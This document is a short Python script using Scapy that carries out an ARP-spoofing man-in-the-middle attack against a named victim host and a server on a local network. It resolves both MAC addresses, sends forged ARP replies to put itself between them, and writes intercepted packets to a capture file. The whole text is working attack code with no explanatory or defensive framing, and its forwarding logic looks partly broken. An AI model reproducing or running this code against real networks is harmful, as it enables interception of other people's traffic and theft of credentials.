#! /usr/bin/python3

from scapy.all import *

myMAC = "08:00:27:c2:50:70"
victim = "192.168.22.4"
server = "192.168.22.200"

packet=Ether(src=myMAC ,dst="ff:ff:ff:ff:ff:ff")/ARP(hwlen=6,plen=4,op=1,hwsrc=myMAC,psrc=server,pdst=victim)
answer = srp1(packet, timeout=1, verbose=False)

victimMAC = answer[ARP].hwsrc
print("ahah :D vctm: " + victimMAC)

packet=Ether(src=myMAC ,dst="ff:ff:ff:ff:ff:ff")/ARP(hwlen=6,plen=4,op=1,hwsrc=myMAC,psrc="192.168.22.40",pdst=server)
answer2 = srp1(packet, timeout=1, verbose=False)

serverMAC = answer2[ARP].hwsrc
print("ahah :D srv: " + serverMAC)

def test(pa):
	if pa.haslayer(ARP) is True:
		if pa[ARP].psrc == victim and pa[ARP].pdst == server and pa[ARP].op == 1:
			print("A", flush=True)
			pr = Ether(src=myMAC, dst=victimMAC)/ARP(hwlen=pa[ARP].hwlen, plen=pa[ARP].plen, op=2, hwsrc=myMAC, psrc=server, pdst=victim, hwdst=victimMAC)
			send(pr, verbose=False)
		elif pa[ARP].psrc == server and pa[ARP].pdst == victim and pa[ARP].op == 1:
			print("A", flush=True)
			pr = Ether(src=myMAC, dst=serverMAC)/ARP(hwlen=pa[ARP].hwlen, plen=pa[ARP].plen, op=2, hwsrc=myMAC, psrc=victim, pdst=server, hwdst=serverMAC)
			send(pr, verbose=False)			
			

	if pa.haslayer(IP) is True:
		if pa[IP].src == victim and pa[IP].dst == server:
			print("I.", flush=True)
			pr = Ether(src=myMAC, dst=victimMAC)/IP(src=server, dst=victim)
			send(pr, verbose=False)
			wrpcap('mitm-tcp.pcap', pa, append=True)
		elif pa[IP].src == server and pa[IP].dst == victim:
			print("I.", flush=True)
			pr = pr = Ether(src=myMAC, dst=serverMAC)/IP(src=victim, dst=server)
			send(pr, verbose=False)
			wrpcap('mitm-tcp.pcap', pa, append=True)
			
			
			
print("[*] Attaque...")
bpf = "ether src " +  victimMAC
sniff(filter=bpf, prn=test)


